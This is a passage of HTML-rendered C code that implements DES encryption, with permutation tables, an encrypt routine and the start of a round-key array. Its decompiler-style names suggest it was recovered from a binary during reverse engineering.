number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10041040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00041000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10041000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> word_7FF65FC70900<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF65FC70910<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x00800000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00400000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00200000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00100000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00080000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00040000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00020000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00010000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00008000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00002000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00001000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x00000080</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000040</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000010</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000002</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000001</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF65FC70970<span class=\"token punctuation\">[</span><span class=\"token number\">56</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF65FC709A8<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> __fastcall <span class=\"token function\">des_encrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> DWORD <span class=\"token operator\">*</span>a2<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF0F0F0F</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x0000FFFF</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x33333333</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x00FF00FF</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xAAAAAAAA</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> result1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s5<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                               s7<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n        right <span class=\"token operator\">^=</span> s2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s4<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s6<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 s8<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                 result1<span class=\"token punctuation\">;</span>\n\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        result1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s5<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                  s7<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        temp <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>a2<span class=\"token operator\">++</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n        left <span class=\"token operator\">^=</span> s2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s4<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s6<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                s8<span class=\"token punctuation\">[</span>temp <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span>\n                result1<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xAAAAAAAA</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00FF</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x33333333</span><span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFF</span><span class=\"token punctuation\">;</span>\n    right <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n    left <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n\n    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>right <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x0F0F0F0F</span><span class=\"token punctuation\">;</span>\n\n    a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>temp <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> left<span class=\"token punctuation\">;</span>\n    a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> temp <span class=\"token operator\">^</span> right<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x2C0B3C36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09221A0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2829051D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09123B0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C091B18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0512011F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09292E17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07122920</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x090D1703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0514372E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0915123C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27100E27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01050927</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25150D29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13151F32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24112618</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03052031</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34312B37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13043A05</span><span class=\"token 